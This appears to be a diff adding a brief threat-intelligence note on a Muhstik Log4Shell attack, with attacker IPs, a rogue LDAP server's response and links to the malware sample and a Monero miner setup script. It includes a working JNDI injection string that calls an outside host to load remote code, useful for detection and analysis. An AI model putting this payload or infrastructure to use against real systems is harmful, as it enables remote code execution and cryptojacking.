@@ -1,0 +1,17 @@
+WAF bypass by Muhstik - nothing tried direct ${jndi:ldap://5.101.118.127:1389/Exploit} in UA.
+Rogue ldap server
+
+:~$ curl ldap://5.101.118.127:1389/Exploit
+DN: Exploit
+	javaClassName: foo
+
+	javaCodeBase: http://165.22.2.186:80/wp-content/themes/twentyseventeen/
+
+	objectClass: javaNamingReference
+
+	javaFactory: Exploit
+
+  Exploit.class - https://bazaar.abuse.ch/sample/a04a0cac9e896d12c2c50754f9a27d6127d1b7ebaafb04d45582621b6f91cc57/
+  Github link which has monero ocean which the malware uses - https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat
+
+  Github link is live as of now.
